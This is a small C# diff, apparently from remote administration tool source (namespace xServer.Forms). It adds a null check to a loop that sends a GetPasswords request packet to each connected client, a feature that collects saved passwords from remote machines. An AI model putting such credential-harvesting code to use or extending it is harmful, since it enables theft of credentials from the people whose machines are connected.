@@ -41,6 +41,7 @@ namespace xServer.Forms
 
             foreach (Client client in ConnectedClients)
             {
+                if (client == null) continue;
                 // Send request packet
                 new Core.Packets.ServerPackets.GetPasswords().Execute(client);
             }
